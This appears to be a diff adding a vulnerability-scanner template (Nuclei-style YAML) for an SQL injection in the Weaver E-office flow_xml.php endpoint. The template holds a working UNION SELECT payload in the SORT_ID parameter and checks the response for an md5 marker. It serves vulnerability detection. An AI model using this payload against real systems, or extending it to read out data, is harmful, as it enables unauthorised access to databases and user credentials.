@@ -1,0 +1,23 @@
+id: weaver-e-office-flow_xml-sql
+
+info:
+  name: "泛微E-office系统flow_type目录flow_xml.php接口SQL注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    泛微E-office系统在flow_type目录下的flow_xml.php接口中存在SQL注入安全缺陷。攻击者通过构造恶意输入，可绕过输入验证机制，向数据库注入恶意SQL代码，从而实现对后端数据库的未授权访问及敏感数据泄露。该漏洞可能允许攻击者获取数据库结构、用户凭证及其他机密信息，进而对系统造成进一步威胁。
+  tags: 泛微
+
+http:
+- raw:
+  - |
+    GET /general/system/workflow/flow_type/flow_xml.php?SORT_ID=1%20union%20select%201,(md5(5)),3,4,5,6,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'e4da3b7fbbce2345d7772b0674a318d5'
